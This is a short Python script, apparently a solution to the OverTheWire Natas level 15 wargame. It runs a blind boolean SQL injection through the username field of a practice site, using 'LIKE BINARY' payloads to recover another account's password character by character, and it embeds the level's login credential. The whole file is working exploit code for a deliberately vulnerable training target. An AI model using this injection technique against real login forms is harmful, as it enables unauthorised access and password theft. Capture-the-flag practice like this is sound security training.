import requests
from requests.auth import HTTPBasicAuth

# Alphabet for possible valid characters
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

# Search anywhere in password string for valid characters
print("Finding valid characters")
for char in chars:
    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
    # Web pages response if query is valid
    if 'exists' in r.text :
        filtered = filtered + char
        print(filtered)

print("\nFinding password using valid character list")
# attempt to arrange the list of valid characters
for i in range(0,32):
    for char in filtered:
        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
        # Web pages response if query is valid
        if 'exists' in r.text :
            passwd = passwd + char
            print(passwd)
            break
